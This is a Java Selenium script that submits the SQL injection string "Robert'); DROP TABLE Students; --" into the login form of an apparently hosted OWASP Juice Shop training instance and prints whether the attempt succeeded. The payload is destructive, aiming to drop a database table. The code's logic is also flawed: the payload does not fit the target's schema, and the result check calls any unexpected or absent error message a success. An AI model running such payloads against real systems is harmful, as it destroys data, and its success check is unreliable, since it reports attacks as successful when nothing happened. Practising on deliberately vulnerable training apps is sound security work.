import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;

public class LoginSQLInjection {
    public static void main(String[] args) {
        System.setProperty("webdriver.chrome.driver", "/path/to/chromedriver");
        WebDriver driver = new ChromeDriver();

        driver.get("https://juice-shop.herokuapp.com/#/login");

        WebElement usernameField = driver.findElement(By.name("email"));
        WebElement passwordField = driver.findElement(By.name("password"));

        String maliciousUsername = "Robert'); DROP TABLE Students; --";

        usernameField.sendKeys(maliciousUsername);
        passwordField.sendKeys("password123");

        driver.findElement(By.xpath("//button[@type='submit']")).click();

        WebDriverWait wait = new WebDriverWait(driver, 10);
        WebElement errorMessage = wait.until(ExpectedConditions.visibilityOfElementLocated(By.xpath("//div[@class='error-message']")));

        if (errorMessage.getText().contains("Invalid username or password")) {
            System.out.println("SQL injection attempt failed.");
        } else {
            System.out.println("SQL injection attempt successful!");
        }

        driver.quit();
    }
}